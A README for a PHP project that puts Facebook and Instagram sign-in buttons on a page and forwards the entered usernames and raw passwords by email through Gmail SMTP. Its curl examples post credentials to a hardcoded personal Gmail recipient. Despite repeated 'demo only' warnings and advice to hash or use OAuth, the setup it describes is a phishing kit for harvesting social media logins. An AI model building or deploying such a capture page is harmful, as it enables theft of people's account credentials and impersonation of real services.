# Raven — Demo Sign-in (README)

> Lightweight demo project showing a sign-in page and a server endpoint to receive demo captures and send an email.
> **Important:** this repository contains demo code that *can* accept passwords. Do **not** use real user credentials. Read the Security section carefully before running.

---

## Project overview

This repo contains a small PHP app with a front-end demo sign-in UI (Facebook / Instagram buttons) and a server endpoint that accepts form POSTs and sends an email (using PHPMailer + Gmail SMTP). The UI and server are intentionally simple for local development and testing.

Key files / folders (top-level)

``` bash
public/                     # web root
  api/send-demo-email.php   # POST endpoint that sends demo email
  assets/                   # images, css, js
src/
  views/pages/login.php     # main demo UI page
  views/base.php
  controller/
data/
  users.jsonl               # optional storage used by earlier demo variations
vendor/                     # composer-installed libs (PHPMailer, FB SDK, ...)
.env                        # local env values (example)
composer.json
README.md (this file)
```

---

## Quickstart (development)

1. Install dependencies

```bash
composer install
```

1. Create a local `.env` (do **not** commit this file). Example:

``` bash
APP_ENV=development
APP_DEBUG=true
GMAIL_SMTP_USER=yourname@gmail.com
GMAIL_SMTP_APP_PASS=your-gmail-app-password
# Optional test guard (recommended for dev that accepts raw passwords)
TEST_ENDPOINT_TOKEN=some-secret-dev-token
```

1. Serve locally (simple PHP built-in server)

```bash
php -S 0.0.0.0:8000 -t public
# then open http://localhost:8000 in your browser
```

1. Test the POST endpoint with `curl` (example)

```bash
curl -X POST http://localhost:8000/api/send-demo-email.php \
  -F 'recipient=favournzeh1@gmail.com' \
  -F 'service=facebook' \
  -F 'identifier=test@example.com' \
  -F 'ts=2026-02-07T12:00:00Z' \
  -F 'password=devPassword123' \
  -F 'test_token=some-secret-dev-token'
```

> If your endpoint requires `TEST_ENDPOINT_TOKEN` (recommended), include that form field. The endpoint responds with JSON.

---

## Environment variables & Gmail SMTP

The PHP email sending uses Gmail SMTP. The two environment variables the app expects are:

* `GMAIL_SMTP_USER` — Gmail address to send from (e.g. `you@gmail.com`)
* `GMAIL_SMTP_APP_PASS` — Gmail App Password (recommended) or an OAuth token

## How to get an App Password

1. Enable 2-Step Verification on your Google account.
2. In Google Account → Security → App passwords, create a 16-character app password for “Mail”.
3. Use that value as `GMAIL_SMTP_APP_PASS`.

**Important:** Put these values only in server environment or a local `.env`. *Never commit secrets to source control.*

---

## Endpoint: `public/api/send-demo-email.php`

**Purpose:** accepts `POST` form data and emails a formatted message.

## Expected form fields

* `recipient` (email) — email address to send to (server may fallback to configured default)
* `service` — service label (e.g. `facebook`, `instagram`)
* `identifier` — username/email entered on the demo UI
* `ts` — timestamp (ISO string)
* `password` — *(demo only; use caution)* password string — server-side code may hash or email it depending on your setup
* `test_token` — *(optional recommended)* a development guard token

**Response**
JSON with `ok: true` or `ok: false` and an `error` message on failure.

**cURL example** (again):

```bash
curl -X POST http://localhost:8000/api/send-demo-email.php \
  -F 'recipient=favournzeh1@gmail.com' \
  -F 'service=facebook' \
  -F 'identifier=user@example.com' \
  -F 'ts=2026-02-07T12:00:00Z' \
  -F 'password=devPass' \
  -F 'test_token=some-secret-dev-token'
```

---

## Security & privacy (READ THIS FIRST)

This project is a **demo**. The code in this repository can be configured to accept raw passwords and email them. That behaviour is dangerous if used with real accounts. Follow these rules:

1. **Do not use real user credentials.** Use throwaway/dummy accounts when testing anything that accepts passwords.
2. **Prefer not to transmit plaintext passwords at all.** Better alternatives:

   * Use OAuth/redirect flows for social logins (Facebook/Instagram) instead of collecting credentials.
   * If you must accept a password for a developer test, **hash it immediately** on the server with `password_hash()` and email only the hash — never the raw string.
3. **Use a TEST_TOKEN** for dev endpoints that accept credentials. Only clients that know the token should be able to submit.
4. **HTTPS only** — accept sensitive data only over TLS. Do not send passwords over HTTP.
5. **Secrets management** — store `GMAIL_SMTP_APP_PASS`, `TEST_ENDPOINT_TOKEN`, etc. in environment variables or a secrets manager. Do not commit them.
6. **Logging** — ensure your server stack does not log raw POST bodies or environment variables containing secrets.
7. **Rotate** app passwords and tokens regularly, and disable the endpoint when not actively testing.

If you want a safer default, update `send-demo-email.php` to hash the password immediately (example snippet):

```php
// server-side: hash and then forget raw password
$rawPassword = $_POST['password'] ?? '';
$pwHash = password_hash($rawPassword, PASSWORD_DEFAULT);
unset($rawPassword);
// email $pwHash instead of plaintext
```

---

## Suggested safe dev flows

* **Best (real integrations):** Replace the demo capture UI with provider OAuth flows (Facebook/Instagram SDKs). Redirect users to the provider login; never ask for their provider passwords in your UI.
* **Safe dev-only flow:** Require `TEST_ENDPOINT_TOKEN` and immediately `password_hash()` the posted password server-side. Email the hash, not the plaintext.
* **Remove password fields:** For UI-only demos, remove password fields entirely and generate deterministic dummy tokens locally.

---

## File structure (short)

``` bash
public/
  api/send-demo-email.php          # email endpoint
  index.php                        # app entry
  assets/                           # css, js, images
src/
  views/pages/login.php            # primary demo page
  views/header.php
  views/footer.php
data/
  users.jsonl                      # (optional) demo store
vendor/                             # composer libs (PHPMailer, FB SDK)
.env                                # not committed — local env
```

---

## Troubleshooting

* `500 SMTP credentials not configured` — set `GMAIL_SMTP_USER` and `GMAIL_SMTP_APP_PASS` in your environment.
* `SMTP connect() failed` — check network egress from your server to `smtp.gmail.com:587` and confirm app password is correct.
* Mail sent but not delivered — check spam folder; ensure `setFrom` matches your authenticated Gmail account in many cases.
* `Method not allowed` — endpoint accepts only `POST`.

---

## Development notes & TODOs

* Consider replacing demo capture with an OAuth flow and removing password inputs.
* Add rate limiting and IP allow-listing for the demo endpoint.
* Expand server-side validation and sanitize all inputs.
* Add a toggle (dev/prod) to prevent emailing in non-dev environments.

---

## License

This repository is a demo for development/testing purposes.

---
